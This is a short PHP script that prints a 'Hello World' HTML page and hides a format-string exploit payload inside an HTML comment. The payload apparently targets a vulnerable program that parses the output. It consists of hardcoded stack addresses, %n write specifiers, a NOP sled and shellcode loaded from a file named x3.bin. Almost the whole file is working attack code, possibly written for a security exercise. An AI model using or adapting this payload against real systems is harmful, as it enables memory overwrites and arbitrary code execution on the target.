<?php
    echo "<html><body>Hello World!!!</body></html><!--"
  //39 chars
?>
<?php
$s = "";
$s = $s . "\x7c\xf0\xff\xbf....\x7d\xf0\xff\xbf....\x7e\xf0\xff\xbf....\x7f\xf0\xff\xbf";
$s = $s . "%240u%333\$n%246u%335\$n%265u%337\$n%192u%339\$n";
for ($i = 0; $i < 41; $i++) {
  $s = $s . "\x90";
}

$file = file_get_contents("x3.bin");

$s = $s . $file;
echo $s;
echo "-->";
?>